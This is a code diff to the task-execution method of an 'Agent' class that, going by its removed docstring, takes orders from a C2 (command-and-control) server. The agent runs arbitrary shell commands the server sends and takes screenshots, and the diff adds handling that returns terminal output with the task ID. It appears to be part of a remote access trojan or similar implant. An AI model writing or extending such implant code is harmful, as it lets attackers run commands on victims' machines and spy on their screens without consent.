@@ -646,12 +646,24 @@ class Agent:
         return data
 
     def _execute_task(self, task):
-        """Execute a task from the C2 server"""
         try:
             task_type = task.get("type")
             
             if task_type == "shell":
-                return SystemUtils.execute_command(task.get("command", ""))
+                result = SystemUtils.execute_command(task.get("command", ""))
+                
+                # Add proper terminal output handling
+                if task.get("terminal", False):
+                    return {
+                        "status": "success",
+                        "output": result.get("output", ""),
+                        "error": result.get("error", ""),
+                        "terminal": True,
+                        "task_id": task.get("task_id")  # Echo back the task_id
+                    }
+                return result
+            
+
             
             elif task_type == "screenshot":
                 screenshot = SystemUtils.take_screenshot()
